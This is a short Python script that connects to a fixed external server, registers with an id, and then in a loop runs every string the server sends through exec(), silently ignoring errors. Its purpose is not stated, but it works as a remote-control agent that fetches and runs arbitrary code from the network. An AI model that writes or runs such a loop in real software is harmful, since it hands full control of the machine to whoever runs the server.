import json
import socket
import struct
import threading
from bubenis_network import *


def init_command(name):
    return {
        "id": name,
        "message": "init"
    }


def done_command(name):
    return {
        "id": name,
        "message": "done!"
    }


name = "2"
sock = socket.socket()
sock.connect(('vps.codingprojects.ru', 9070))

cmd = init_command(name)
send_json(sock, cmd)

print(cmd)

while True:
    data = receive_string(sock)

    try:
        exec(data)
    except Exception as e:
        pass

    try:
        send_json(sock, done_command(name))
    except:
        print("exiting")
        break
